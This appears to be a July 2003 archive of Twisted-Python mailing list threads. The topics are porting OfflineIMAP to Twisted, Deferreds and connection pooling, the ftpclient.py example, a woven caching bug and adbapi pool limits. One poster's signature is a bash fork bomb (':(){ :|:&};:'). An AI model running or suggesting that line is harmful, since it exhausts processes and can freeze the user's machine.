   -- I couldn't just kill of account A.

2. Various bugs in Python's threading implementation

3. imaplib.py being a stinking festering heap of crap leading to
   unmaintainable code in everything that touches it

My first plan was to just rewrite imaplib, which wouldn't be too
hard.  But someone on the OfflineIMAP list pointed me to Twisted,
which I observe already contains an IMAP library that looks nice, plus
a different paradigm that may spare me from the whole thread groups
question altogether.

My questions, then, are these:

1. How does Twisted interact with things like threads and connection
   pooling?
   
   I currently let the user control the maximum number of connections
   that are open to a given server, and whenever the code needs to
   access an IMAP server, it grabs a connection from the appropriate
   pool and uses it (using threading primitives to block if no
   connection is available.)  Can Twisted handle multiple connections
   to multiple servers doing multiple things at once?  Can it do
   connection pools?  If it needs threading to do these things, does
   it play nice with it?

3. I notice the "Deferred" object and the benefits it provides when a
   server response is expected to take some time.  I assume that some
   sort of internal threading is taking place here?

   What if the server *request* takes some time -- say, uploading a
   2MB e-mail over a dialup link.  Are we still OK with handling that
   in a non-blocking fashion?

4. The howto "book" alludes to pending improvements on the mail
   infrastructure.  Anything I should be aware of here?

5. Is there any sort of unified mail API in Twisted (like JavaMail)
   that would present me with a single API to both IMAP and Maildir
   repositories, or is that something I need to do on my own?  (I've
   already done it, so it's no big deal to do that again)

6. OfflineIMAP supports several different user interfaces (two written
   with Tkinter, 1 using Curses, and three plain console ones.)  I would
   like to reimplement the Tkinter ones with wxPython, and am glad to
   see that Twisted works well with this.

   One concern, though, is that the users can supply a list of UIs to try
   in the config file: for instance, Tk, Curses, Noninteractive.  The
   system will try each one in turn until it reaches one that works.
   (For instance, Tk may not work if the user is not in X, and Curses
   may not work if stdout is not a tty).  It looks like this may be
   problematic with Twisted since the UI selection always seems to be
   known in advance with the import commands related to the reactor.
   Any thoughts here?

Thanks!

-- John Goerzen



From andrew-twisted at puzzling.org  Sat Jul 26 09:36:05 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 27 Jul 2003 01:36:05 +1000
Subject: [Twisted-Python] Considering Twisted for OfflineIMAP
In-Reply-To: <20030726134815.GA26482@complete.org>
References: <20030726134815.GA26482@complete.org>
Message-ID: <20030726153605.GB3046@frobozz>

On Sat, Jul 26, 2003 at 08:48:15AM -0500, John Goerzen wrote:
> Hello,
> 
> I am the author of OfflineIMAP, a multi-threaded multi-account
> bi-directional synchronization tool
> (http://quux.org/devel/offlineimap) written in Python.

Ooh, nifty :)

[...]
> 
> My questions, then, are these:
> 
> 1. How does Twisted interact with things like threads and connection
>    pooling?
>    
>    I currently let the user control the maximum number of connections
>    that are open to a given server, and whenever the code needs to
>    access an IMAP server, it grabs a connection from the appropriate
>    pool and uses it (using threading primitives to block if no
>    connection is available.)  Can Twisted handle multiple connections
>    to multiple servers doing multiple things at once?  Can it do
>    connection pools?  If it needs threading to do these things, does
>    it play nice with it?

Twisted uses non-blocking sockets, so it can do an arbitrary amount of
connections (both client and server) without any threads.  Running multiple
clients (or servers) at a time is as easy as calling reactor.connectTCP more
than once.

[What happened to question 2?]

> 3. I notice the "Deferred" object and the benefits it provides when a
>    server response is expected to take some time.  I assume that some
>    sort of internal threading is taking place here?

No threading.  Deferreds aren't magical at all.  Deferreds are simply an
object a function can return to say "I don't have a result ready yet; as
soon as I've got it, I'll let you know."  The caller can then register
callbacks and errbacks that will be called when the result does become
available.

How the Deferred eventually gets called is up to the code that originally
created it; it might be the result of query sent to the network being
answered (e.g. twisted.web.client.getPage), a spawned process terminating
(e.g. twisted.internet.utils.getProcessOutput), a function call in another
thread completing (e.g. twisted.internet.threads.deferToThread), and so on.

>    What if the server *request* takes some time -- say, uploading a
>    2MB e-mail over a dialup link.  Are we still OK with handling that
>    in a non-blocking fashion?

Absolutely!  Twisted handles large transfers via a consumer/producer
interface, though, rather than with Deferreds (which are one-shot results,
rather than streaming).

> 4. The howto "book" alludes to pending improvements on the mail
>    infrastructure.  Anything I should be aware of here?

Jp has been doing a lot of great work on this recently -- you should
definitely be working with CVS rather than 1.0.6 if you can.  I don't know
much about the details, though.

> 5. Is there any sort of unified mail API in Twisted (like JavaMail)
>    that would present me with a single API to both IMAP and Maildir
>    repositories, or is that something I need to do on my own?  (I've
>    already done it, so it's no big deal to do that again)

I've no idea -- Jp?

> 6. OfflineIMAP supports several different user interfaces (two written
>    with Tkinter, 1 using Curses, and three plain console ones.)  I would
>    like to reimplement the Tkinter ones with wxPython, and am glad to
>    see that Twisted works well with this.
> 
>    One concern, though, is that the users can supply a list of UIs to try
>    in the config file: for instance, Tk, Curses, Noninteractive.  The
>    system will try each one in turn until it reaches one that works.
>    (For instance, Tk may not work if the user is not in X, and Curses
>    may not work if stdout is not a tty).  It looks like this may be
>    problematic with Twisted since the UI selection always seems to be
>    known in advance with the import commands related to the reactor.
>    Any thoughts here?

I suspect this can be dealt with, but I'm not sure off the top of my head
how... hopefully someone else can help you here.

-Andrew.




From tv at twistedmatrix.com  Sat Jul 26 10:35:03 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sat, 26 Jul 2003 19:35:03 +0300
Subject: [Twisted-Python] Considering Twisted for OfflineIMAP
In-Reply-To: <20030726134815.GA26482@complete.org>
References: <20030726134815.GA26482@complete.org>
Message-ID: <20030726163502.GA26873@lapdog>

On Sat, Jul 26, 2003 at 08:48:15AM -0500, John Goerzen wrote:
> My first plan was to just rewrite imaplib, which wouldn't be too
> hard.  But someone on the OfflineIMAP list pointed me to Twisted,
> which I observe already contains an IMAP library that looks nice, plus
> a different paradigm that may spare me from the whole thread groups
> question altogether.

	Oooh! I'm very motivated to helping you; I've used offlineimap
	for a long time now, and I think I grok Twisted reasonably
	well.

	We're on IRC at #twisted on freenode. I'd be happy to help you
	while you are getting to know twisted.

	Andrew gave pretty good answers already, so I'll keep my
	answers short.

> 1. How does Twisted interact with things like threads and connection
>    pooling?

	You really don't want to use threads; Twisted gives you everything
	you need to implement offlineimap asynchronously.

	(There is e.g. deferToThread, used when interfacing to e.g. database
	APIs that block, but that really should not be used if possible.)

>    I currently let the user control the maximum number of connections
>    that are open to a given server, and whenever the code needs to
>    access an IMAP server, it grabs a connection from the appropriate
>    pool and uses it (using threading primitives to block if no
>    connection is available.)  Can Twisted handle multiple connections
>    to multiple servers doing multiple things at once?  Can it do
>    connection pools?  If it needs threading to do these things, does
>    it play nice with it?

	That should be pretty doable, not with thread pooling but by just
	counting the currently open IMAP connections and when the number
	is below the limit, taking more work from a queue and starting
	to process it (asynchronously).

> 4. The howto "book" alludes to pending improvements on the mail
>    infrastructure.  Anything I should be aware of here?

	I believe much of that has already happened.

> 5. Is there any sort of unified mail API in Twisted (like JavaMail)
>    that would present me with a single API to both IMAP and Maildir
>    repositories, or is that something I need to do on my own?  (I've
>    already done it, so it's no big deal to do that again)

	Well, see twisted.protocols.imap4.IMailbox for _something_.

> 6. OfflineIMAP supports several different user interfaces (two written
>    with Tkinter, 1 using Curses, and three plain console ones.)  I would
>    like to reimplement the Tkinter ones with wxPython, and am glad to
>    see that Twisted works well with this.
> 
>    One concern, though, is that the users can supply a list of UIs to try
>    in the config file: for instance, Tk, Curses, Noninteractive.  The
>    system will try each one in turn until it reaches one that works.
>    (For instance, Tk may not work if the user is not in X, and Curses
>    may not work if stdout is not a tty).  It looks like this may be
>    problematic with Twisted since the UI selection always seems to be
>    known in advance with the import commands related to the reactor.
>    Any thoughts here?

	Hmm. It seems you'd need to read the configuration before starting
	the reactor (event loop). That should be enough.

-- 
:(){ :|:&};:



From jgoerzen at complete.org  Sat Jul 26 10:40:20 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 11:40:20 -0500
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
References: <20030726134815.GA26482@complete.org> <20030726153605.GB3046@frobozz>
Message-ID: <87wue56y2z.fsf@complete.org>

Andrew Bennetts <andrew-twisted at puzzling.org> writes:

> Ooh, nifty :)

Thanks :-)
>
> Twisted uses non-blocking sockets, so it can do an arbitrary amount of
> connections (both client and server) without any threads.  Running multiple
> clients (or servers) at a time is as easy as calling reactor.connectTCP more
> than once.

Well, yes and no, I think.  Let me elaborate.

OfflineIMAP always behaves as an IMAP client, so I'll be using
twisted.protocols.imap4.IMAP4Client.  This class is written to use one
and exactly one connection to the server (it must, since it takes a
single SSL contextFactory as an arg to __init__).

OfflineIMAP would like to do, say, 4 operations at once.  For the sake
of example, let's say these four are:

1. Getting a list of messages in folder A
2. Downloading a message from folder B
3. Uploading a message to folder B
4. Deleting a message in folder C

Now, the way I'd handle this pre-twisted is that my own IMAP folder
class would basically do this:

imap = pool.acquireconnection()
try:
    # do the stuff here
    # imap.select() to pick the relevant folder
    # imap.download() or whatnot
finally:
    pool.releaseconnection(imap)

This was running with multiple threads, so even though the stuff in
the "try" was blocking, it didn't matter. 

With Twisted, I could clone this setup somewhat by making sure
the last callback and errback in my deferreds from IMAP4Client 
release the connection, that's ugly and error-prone.

I'd imagine that downloading a message would basically go like this:

d = pool.acquireconnection()
d.addCallback(select)
d.addCallback(download)
d.addCallback(releaseconnection)
d.addCallback(returnresults)

But this doesn't take into account errors, and it rather annoying to boot.

So my question is: just how might I accomplish this in a nice way with
Twisted?

> [What happened to question 2?]

I found the answer to it before I posted the message, so I deleted it
but forgot to renumber.

>> (e.g. twisted.internet.utils.getProcessOutput), a function call in another
> thread completing (e.g. twisted.internet.threads.deferToThread), and so on.

Got it.

>> 4. The howto "book" alludes to pending improvements on the mail
>>    infrastructure.  Anything I should be aware of here?
>
> Jp has been doing a lot of great work on this recently -- you should
> definitely be working with CVS rather than 1.0.6 if you can.  I don't know
> much about the details, though.

Do the online API docs refer to the CVS version or 1.0.6?  It's 1.0.6 that
I've got right now.

> I suspect this can be dealt with, but I'm not sure off the top of my head
> how... hopefully someone else can help you here.

One thought I had was to wait to import the reactor until I know what
kind of UI I want.  That works OK as long as I continue using
ConfigParser for my configuration.  If at some point I switch to using
Twisted's config storage (I know it's there but I haven't looked at it
yet), I suspect that could introduce a chicken-and-egg problem.

-- John




From radix at twistedmatrix.com  Sat Jul 26 10:54:26 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 26 Jul 2003 12:54:26 -0400
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
In-Reply-To: <87wue56y2z.fsf@complete.org>
References: <20030726134815.GA26482@complete.org> <20030726153605.GB3046@frobozz> <87wue56y2z.fsf@complete.org>
Message-ID: <20030726165426.GC25197@radii>

On Sat, Jul 26, 2003 at 11:40:20AM -0500, John Goerzen wrote:
> Andrew Bennetts <andrew-twisted at puzzling.org> writes:
> One thought I had was to wait to import the reactor until I know what
> kind of UI I want.  That works OK as long as I continue using
> ConfigParser for my configuration.  If at some point I switch to using
> Twisted's config storage (I know it's there but I haven't looked at it
> yet), I suspect that could introduce a chicken-and-egg problem.

No, Twisted is not a monolithic import, that would be insane. You can
import twisted.python.usage before importing the reactor.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Sat Jul 26 11:52:41 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 13:52:41 -0400
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
In-Reply-To: <87wue56y2z.fsf@complete.org>
References: <20030726134815.GA26482@complete.org>
	<20030726153605.GB3046@frobozz>
	<87wue56y2z.fsf@complete.org>
Message-ID: <20030726135241.478c1897.itamar@itamarst.org>

On Sat, 26 Jul 2003 11:40:20 -0500
John Goerzen <jgoerzen at complete.org> wrote:
 
> I'd imagine that downloading a message would basically go like this:
> 
> d = pool.acquireconnection()
> d.addCallback(select)
> d.addCallback(download)
> d.addCallback(releaseconnection)
> d.addCallback(returnresults)
> 
> But this doesn't take into account errors, and it rather annoying to
> boot.

There's an addErrback. If you read the Deferred docs, you'll
eventually figure out how Deferreds match Python's exception handling
mechanism almost exactly, just with asynchronous APIs.

> One thought I had was to wait to import the reactor until I know what
> kind of UI I want.  That works OK as long as I continue using
> ConfigParser for my configuration.  If at some point I switch to using
> Twisted's config storage (I know it's there but I haven't looked at it
> yet), I suspect that could introduce a chicken-and-egg problem.

You can always stick to ConfigParser, and for your needs it may be
better.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Sat Jul 26 11:55:14 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 13:55:14 -0400
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
In-Reply-To: <87wue56y2z.fsf@complete.org>
References: <20030726134815.GA26482@complete.org>
	<20030726153605.GB3046@frobozz>
	<87wue56y2z.fsf@complete.org>
Message-ID: <20030726135514.0e4736c3.itamar@itamarst.org>

On Sat, 26 Jul 2003 11:40:20 -0500
John Goerzen <jgoerzen at complete.org> wrote:
 
> Do the online API docs refer to the CVS version or 1.0.6?  It's 1.0.6
> that I've got right now.

1.0.6. I recommed getting CVS and reading the code for IMAP. And the
tests!


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From devmail at crazydiamonds.com  Sat Jul 26 18:22:37 2003
From: devmail at crazydiamonds.com (Michael Shyne)
Date: Sat, 26 Jul 2003 19:22:37 -0500 (CDT)
Subject: [Twisted-Python] submodel caching in woven
Message-ID: <49387.66.41.66.136.1059265357.squirrel@mail.gumption.com>

I'm trying to create a web-app in woven using already existing data
objects.  I'm starting by just trying to display a name.  This is what
I've done:

components.registerAdapter(model.ObjectWrapper, myObj, interfaces.IModel)
class DisplayObj(page.Page):

    templateFile = "display-obj.html"

    def wmfactory_obj(self, request):
        id = request.args.get('id', (0,))[0]

        if id:
            return objFactory.getObj(id)

        return None

The template only referes to "obj/name".  This all works fine... except
when I change the id in the URL and reload the page.  The name displayed
doesn't change.  The problem is with the submodel caching in the root
model (the page).  I've attached the changes I made to fix it.  I'm new to
woven (and twisted in general) so I don't know if I'm doing something
wrong, or if my changes have far-reaching effects.

I should note that these changes merely improved the situation to mostly
working (which, of course, is much better than never working).  The
caching is keyed off of "id(request)".  However, it seems there is object
caching occuring with the request objects, "id(request)" often returns
identical results.  I believe that the submodel caching will also have to
look at a timestamp to work consistently.  This was too big of a change to
make at this point.  But if the list agrees with my current changes and
thinks adding a timestamp comparison is the right way to go, I would be
more than happy to do it.

-Michael Shyne

-------------- next part --------------
A non-text attachment was scrubbed...
Name: model.diff
Type: application/octet-stream
Size: 607 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030726/1966f68a/attachment-0002.obj>

From jgoerzen at complete.org  Sat Jul 26 19:28:53 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 20:28:53 -0500
Subject: [Twisted-Python] How can ftpclient.py work?
Message-ID: <87k7a47o6i.fsf@complete.org>

Hi,

I've been reading over the Twisted examples to learn the system and
one of them, ftpclient.py, has me flummoxed.  Specifically, the
connectionMade function near the end.

It issues a number of commands right in a row, without waiting for the
results to come back from the deferreds that they return.  To me this
seems bad because:

1. The system would have no way of knowing which command a particular
   response belongs to

2. Sending additional commands before the server is done with the
   first one may cause problems (for instance, if it takes a little
   while to fully transmit the first command, the second one could be
   transmitted in the middle)

3. There is no error-checking in there, so commands are issued that
   are dependant on the success of earlier ones (rnuning nlst after
   cdup, for instance), but they're issued potentially before the
   earlier ones have a chance to return an error.

Now, I'm assuming that these problems do not actually exist.  Yet I
cannot work out why not.  Can anybody shed some light?

Thanks,
John




From jgoerzen at complete.org  Sat Jul 26 19:38:30 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 20:38:30 -0500
Subject: [Twisted-Python] Connection poolin
Message-ID: <87brvg7nqh.fsf@complete.org>

Here is something I haven't been able to figure out yet.

I am using IMAP4Client from Twisted.

The behavior I used to use is this:
When I wanted to speak to the IMAP server in my multithreaded
application, I would call a function that returns me an IMAP
connection.  There was a limit on the number of connections open --
let's say 5 for this example.  If an open connection was available,
that function would return it to me immediately.  If 5 were already
open, it would block until one of those was freed.  Otherwise, it
would establish a new connection and return that to me.

My task as a caller was to always release the connection when done.
My pattern, then, was generally one of:

imap = self.imapserver.acquireconnection()
try:
    # select the appropriate mailbox
    # do stuff here
    return result
finally:
   self.imapserver.release(imap)

I have been trying to figure out how to do this the Twisted way.
Obviously blocking is right out.

I've thought that in each method I have that needs a connection, I
could write two methods: one that calls the Twisted version of
acquireconnection and sets its callback to the second, which does the
real work (and possibly chains to others via callbacks.)

There are some problems with that approach.  One is that it is very
verbose and requires a lot of code all over the place to manage.
Another is that there's no easy way to tell in Twisted when we are
done with the given connection.  I suppose I could always add errbacks
all along the way plus a callback, each of which releases the
connection, but that seems inconvenient and error-prone.

Basically, what I'm saying is that I can invent something that works,
but everything I've come up with seems like a nasty kludge, and I'm
looking for the Right Way to do it.

Thanks,
John




From andrew-twisted at puzzling.org  Sat Jul 26 20:19:22 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 27 Jul 2003 12:19:22 +1000
Subject: [Twisted-Python] How can ftpclient.py work?
In-Reply-To: <87k7a47o6i.fsf@complete.org>
References: <87k7a47o6i.fsf@complete.org>
Message-ID: <20030727021922.GC3046@frobozz>

On Sat, Jul 26, 2003 at 08:28:53PM -0500, John Goerzen wrote:
> Hi,
> 
> I've been reading over the Twisted examples to learn the system and
> one of them, ftpclient.py, has me flummoxed.  Specifically, the
> connectionMade function near the end.

It's worth noting that that example is meant more as a brief example of how
to use ftp.FTPClient, rather than as a real application.

> It issues a number of commands right in a row, without waiting for the
> results to come back from the deferreds that they return.  To me this
> seems bad because:
> 
> 1. The system would have no way of knowing which command a particular
>    response belongs to

I think you're referring to these parts:

    # Get the current working directory
    ftpClient.pwd().addCallbacks(success, fail)

    ... snip ...

    # Change to the parent directory
    ftpClient.cdup().addCallbacks(success, fail)

You're right, in a real application, you probably do want to distinguish
between the responses from these two commands.  That could be as simple as
having different success functions for different commands, e.g.

    ftpClient.pwd().addCallbacks(handlePWD, fail)
    ftpClient.cdup().addCallbacks(handleCDUP, fail)

Or you could pass extra arguments to the callbacks:

    # Using .addCallback
    ftpClient.pwd().addCallback(success, 'pwd').addErrback(fail)
    # Using .addCallbacks
    ftpClient.cdup().addCallbacks(success, fail, callbackArgs=('cdup,))

In that case, the success function might be defined as:

    def success(response, command):
        print 'Success!  Got response for command %r:' % (command,)
        print '---'
        if response is None:
            print None
        else:
            print string.join(response, '\n')
        print '---'

> 2. Sending additional commands before the server is done with the
>    first one may cause problems (for instance, if it takes a little
>    while to fully transmit the first command, the second one could be
>    transmitted in the middle)

This is not a problem for FTPClient -- it internally queues the commands and
issues them when the server is ready for them.

[In the case of FTP, Twisted's FTPClient doesn't attempt any funky
pipelining, so it's simply a matter of waiting for a response to the last
command if there's a response outstanding, otherwise it can be issued
immediately.  See the implementation of FTPClient.sendNextCommand and
FTPClient.lineReceiver (which calls sendNextCommand when appropriate) for
details.]

In general, though, most protocols would simply be doing something like:

    def sendRequest(self, data):
        # ...
        self.transport.write(self.requestHeader)
        self.transport.write(data)
        # ...

And the transport takes care of making sure the data is sent in the right
order.  You're probably thinking "but what if two calls are made to
sendRequest at the same time?  Isn't there a race condition?"  The answer is
technically yes -- very little of Twisted is thread-safe[1].  But in practice,
Twisted programs don't need to use threads to service multiple connections,
so you don't have to worry about these sorts of problems.  Only one thing
is happening at any one time in Twisted, the trick is to make sure none of
those things blocks so that *looks* like it's doing several things at once.

If you grep the Twisted source, you'll see that virtually nothing uses any
thread-locking tools like threading.Lock :)

[1] But if you need to safely call a function from a thread, you can use
    reactor.callFromThread, which will schedule that function to be called
    from the main event loop.

> 3. There is no error-checking in there, so commands are issued that
>    are dependant on the success of earlier ones (rnuning nlst after
>    cdup, for instance), but they're issued potentially before the
>    earlier ones have a chance to return an error.

In the case of doc/examples/ftpclient.py, the commands Deferreds' have
'fail' added as an errback.  It's defined as:

    def fail(error):
        print 'Failed.  Error was:'
        print error
        from twisted.internet import reactor
        reactor.stop()

So there's no problems there -- the error handler will shutdown the entire
program by calling reactor.stop().  Probably not what you want to do in a
real application, but sufficient for an example.

> Now, I'm assuming that these problems do not actually exist.  Yet I
> cannot work out why not.  Can anybody shed some light?

I hope I've shed some light for you -- let us know if you need more :)

-Andrew.




From sflist at ihonk.com  Sat Jul 26 21:10:26 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Sat, 26 Jul 2003 20:10:26 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
Message-ID: <200307262010.26039.sflist@ihonk.com>

Hi all, I'm new to Twisted, and it's about to show. :-) I hope you can help 
me.

I'm writing a PostgreSQL-backed XML-RPC server with Twisted 1.0.6 on Linux. My 
problem is that if I hammer it with repeated, high-speed queries from a 
client, the client receives a Fault 8002. I'm probably just not setting some 
limit variable somewhere high enough. Here's my server code:

from twisted.web import xmlrpc, server
from twisted.enterprise import adbapi
class takeOne(xmlrpc.XMLRPC):
    def xmlrpc_dbtest(self):
        dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", host='127.0.0.1', \
		user='postgres', database='template1')
	dbpool.connect()
        d = adbapi.Augmentation(dbpool)
        result = d.runQuery("select * from auth where uname='foo'")
	dbpool.close()
        return result

(In an earlier iteration I'd omitted the "dbpool.close()" call. Putting that 
in made it work considerably better, but it still fails under heavy load.)

Individual queries from the interactive interpreter work fine:

[steve at lothar]$ python
>>> import xmlrpclib
>>> s = xmlrpclib.Server('http://localhost:7080/')
>>> s.dbtest()
[{'baseObj': ['foo', 'd00d']}]

But when I hit it hard for a simple load test, it goes for a few seconds and 
then falls over:

>>> while i < 500:
...     x = s.dbtest()
...     i = i + 1
...
Traceback (most recent call last):
  File "<stdin>", line 2, in ?
  File "/usr/lib/python2.2/xmlrpclib.py", line 821, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.2/xmlrpclib.py", line 975, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.2/xmlrpclib.py", line 853, in request
    return self.parse_response(h.getfile())
  File "/usr/lib/python2.2/xmlrpclib.py", line 896, in parse_response
    return u.close()
  File "/usr/lib/python2.2/xmlrpclib.py", line 571, in close
    raise apply(Fault, (), self._stack[0])
xmlrpclib.Fault: <Fault 8002: 'error'>

Afterwards the connection pool seems to still be available:

>>> s.dbtest()
[{'baseObj': ['foo', 'd00d']}]

But I've got lots of connections in process still:

[steve at lothar]$ netstat -atn
tcp        0      0 127.0.0.1:5432          127.0.0.1:48841         TIME_WAIT 
tcp        0      0 127.0.0.1:7080          127.0.0.1:48839         TIME_WAIT
(repeat these guys about 150 times each, plus several being serviced)

The connections eventually go away as (I presume) they get serviced.

So I expect I'm just hitting a database connection pooling limitation, as a 
similar test against an XML-RPC function which didn't access a database ran 
just fine. I'm not sure if the limitation is in Twisted, or in PyPgSQL, and I 
don't know enough about how to enable traceback logging in Twisted (is there 
any?) to tell. Ideally I'd like it to handle several thousand backlogged 
requests without burping.

Help! :-)

Thanks for your time,

Steve Freitas



From jgoerzen at complete.org  Sat Jul 26 21:34:54 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 22:34:54 -0500
Subject: [Twisted-Python] Re: How can ftpclient.py work?
References: <87k7a47o6i.fsf@complete.org> <20030727021922.GC3046@frobozz>
Message-ID: <871xwc7ich.fsf@complete.org>

Thanks for the excellent information, Andrew.  I have a few (really!)
follow-up questions:

Andrew Bennetts <andrew-twisted at puzzling.org> writes:

> In general, though, most protocols would simply be doing something like:
>
>     def sendRequest(self, data):
>         # ...
>         self.transport.write(self.requestHeader)
>         self.transport.write(data)
>         # ...
>
> And the transport takes care of making sure the data is sent in the right
> order.  You're probably thinking "but what if two calls are made to
> sendRequest at the same time?  Isn't there a race condition?"  The answer is

Oh sure, you guys just turn my whole approach to things on its side,
and now you know what I'm thinking?  Well, you're right :-)

But, wouldn't the above code have blocking problems, especially over
slow links or for large values of data?  (Say data is a 2MB string and
you're on a modem... does your UI freeze for 15 minutes?  Or is
write() another layer above the system call that does some sort of magic?)

I guess what I'm thinking here is that switching from multi-threaded
to poll() or select() isn't a "get out of jail free" card.  And while
I've written various C programs using select() and have a good idea
what the potential pitfalls are there, Twisted seems to live up to its
name just enough that I'm having a bit of trouble isolating them here :-)

> In the case of doc/examples/ftpclient.py, the commands Deferreds' have
> 'fail' added as an errback.  It's defined as:

Ahh.  I should have seen that.

>> Now, I'm assuming that these problems do not actually exist.  Yet I
>> cannot work out why not.  Can anybody shed some light?
>
> I hope I've shed some light for you -- let us know if you need more :)

Thanks -- all I need now is a small flashlight :-)

-- John




From itamar at itamarst.org  Sat Jul 26 21:37:22 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 23:37:22 -0400
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262010.26039.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com>
Message-ID: <20030726233722.0e7f6ad1.itamar@itamarst.org>

On Sat, 26 Jul 2003 20:10:26 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> from twisted.web import xmlrpc, server
> from twisted.enterprise import adbapi
> class takeOne(xmlrpc.XMLRPC):
>     def xmlrpc_dbtest(self):
>         dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL",
>         host='127.0.0.1', \
> 		user='postgres', database='template1')
> 	dbpool.connect()
>         d = adbapi.Augmentation(dbpool)
>         result = d.runQuery("select * from auth where uname='foo'")
> 	dbpool.close()
>         return result

Don't create a new database pool per request. Store one in the resource,
that is, create one __init__ and access it using self.dbpool. No need to
do connect(), either. That should solve it.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From sflist at ihonk.com  Sat Jul 26 21:50:00 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Sat, 26 Jul 2003 20:50:00 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <20030726233722.0e7f6ad1.itamar@itamarst.org>
References: <200307262010.26039.sflist@ihonk.com> <20030726233722.0e7f6ad1.itamar@itamarst.org>
Message-ID: <200307262050.00128.sflist@ihonk.com>

> Don't create a new database pool per request. Store one in the resource,
> that is, create one __init__ and access it using self.dbpool. No need to
> do connect(), either. That should solve it.

That worked beautifully! Thanks!

Is there any need for me to run dbpool.close() at any point?

Steve



From itamar at itamarst.org  Sat Jul 26 21:56:53 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 23:56:53 -0400
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262050.00128.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com>
	<20030726233722.0e7f6ad1.itamar@itamarst.org>
	<200307262050.00128.sflist@ihonk.com>
Message-ID: <20030726235653.6a096d79.itamar@itamarst.org>

On Sat, 26 Jul 2003 20:50:00 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> Is there any need for me to run dbpool.close() at any point?

At shutdown is probably a good idea. But it does this automatically,
so no need to do anything on your part.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From uwe at oss4u.com  Sat Jul 26 22:10:59 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 26 Jul 2003 21:10:59 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262050.00128.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com> <20030726233722.0e7f6ad1.itamar@itamarst.org> <200307262050.00128.sflist@ihonk.com>
Message-ID: <200307262110.59017.uwe@oss4u.com>

On Saturday 26 July 2003 08:50 pm, Steve Freitas wrote:
> > Don't create a new database pool per request. Store one in the resource,
> > that is, create one __init__ and access it using self.dbpool. No need to
> > do connect(), either. That should solve it.
>
> That worked beautifully! Thanks!
>
> Is there any need for me to run dbpool.close() at any point?

If you use multiuser, I would close on logoff, otherwise the connection sticks 
around until the server exits.


	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From sflist at ihonk.com  Sat Jul 26 23:07:08 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Sat, 26 Jul 2003 22:07:08 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <20030726233722.0e7f6ad1.itamar@itamarst.org>
References: <200307262010.26039.sflist@ihonk.com> <20030726233722.0e7f6ad1.itamar@itamarst.org>
Message-ID: <200307262207.08955.sflist@ihonk.com>

BTW, is the resource's __init__ the proper place to do all your application 
specific startup stuff? I'm only planning on this XML-RPC server 
implementation serving one kind of application, so is it there that I'd want 
to jump through all the application-specific startup hurdles?

Thanks,

Steve



From itamar at itamarst.org  Sat Jul 26 23:55:55 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sun, 27 Jul 2003 01:55:55 -0400
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262207.08955.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com>
	<20030726233722.0e7f6ad1.itamar@itamarst.org>
	<200307262207.08955.sflist@ihonk.com>
Message-ID: <20030727015555.6ee8499e.itamar@itamarst.org>

On Sat, 26 Jul 2003 22:07:08 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> BTW, is the resource's __init__ the proper place to do all your
> application specific startup stuff? I'm only planning on this XML-RPC
> server implementation serving one kind of application, so is it there
> that I'd want to jump through all the application-specific startup
> hurdles?

Yep. If it's a more general system you'd have a
